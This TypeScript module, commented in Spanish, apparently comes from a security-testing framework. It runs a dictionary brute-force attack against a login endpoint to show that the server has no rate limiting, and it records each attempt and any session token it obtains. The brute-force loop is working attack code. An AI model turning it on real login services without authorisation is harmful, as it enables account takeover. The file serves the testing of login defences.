/**
 * Ataque real: fuerza bruta de credenciales contra un login sin rate limit.
 * Prueba varias contraseñas contra una cuenta conocida y demuestra que el
 * servidor nunca frena (no hay 429, ni lockout, ni backoff) antes de acertar.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../../../core/http.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../../../core/types.ts';

const COMMON = ['123456', 'password', 'martin2024', 'qwerty', 'admin123', '12345678', 'notas123'];

export const weakPassword: Attack = {
  meta: CATALOG['weak-password-no-rate-limit'],
  mutating: false, // solo intentos de login (read-only en datos)
  scheduling: {
    // Detectar "sin rate limit" exige baseline limpio (sin 429/401 previos de otros módulos).
    needsCleanBaseline: true,
    alarmFootprint: 'high',
    // No interleaves con jwt-reuse: ambos golpean el login y confundirían los logs de auth.
    mutex: ['jwt-not-invalidated-on-password-change'],
  },
  async run(ctx: AttackContext): Promise<AttackResult> {
    const target = ctx.target.weak_login;
    const steps: AttackStep[] = [];
    if (!target) {
      return skeleton('No se configuró weak_login; no se puede demostrar fuerza bruta dirigida.');
    }

    // Diccionario: contraseñas equivocadas y, al final, la correcta.
    const guesses = [...COMMON.filter((p) => p !== target.password), target.password];
    let blockedEver = false;
    let token: string | null = null;
    let attempts = 0;

    for (const pw of guesses) {
      attempts++;
      const res = await ctx.http.post('/api/auth/login', { email: target.email, password: pw });
      const ok = res.status === 200;
      if (res.status === 429) blockedEver = true;
      steps.push({
        technique: 'Fuerza bruta de credenciales (diccionario)',
        mitre: ['T1110.001'],
        request: reqLine('POST', '/api/auth/login'),
        response_summary: `intento #${attempts} "${pw}" → HTTP ${res.status}${ok ? ' (acierto)' : ''}`,
        exchange: res.exchange,
      });
      if (ok) {
        token = (res.json as { token: string }).token;
        break;
      }
    }

    if (!token) {
      return {
        vuln_id: weakPassword.meta.id,
        confirmed: false,
        blocked: blockedEver,
        steps,
        gained: [],
        attacker_active: false,
        summary: blockedEver
          ? 'El login aplicó rate limit: la fuerza bruta fue frenada.'
          : 'No se adivinó la contraseña con el diccionario de prueba.',
      };
    }

    return {
      vuln_id: weakPassword.meta.id,
      confirmed: !blockedEver,
      blocked: blockedEver,
      steps,
      gained: [`sesión válida de ${target.email} por fuerza bruta en ${attempts} intentos`],
      foothold: { type: 'account', detail: `token de ${target.email}` },
      attacker_active: true,
      summary: `Sin rate limit: ${attempts} intentos contra ${target.email} y la contraseña débil "${target.password}" cayó. El servidor nunca respondió 429.`,
    };
  },
};

function skeleton(reason: string): AttackResult {
  return {
    vuln_id: 'weak-password-no-rate-limit',
    confirmed: false,
    blocked: false,
    steps: [],
    gained: [],
    attacker_active: false,
    summary: reason,
    error: reason,
  };
}
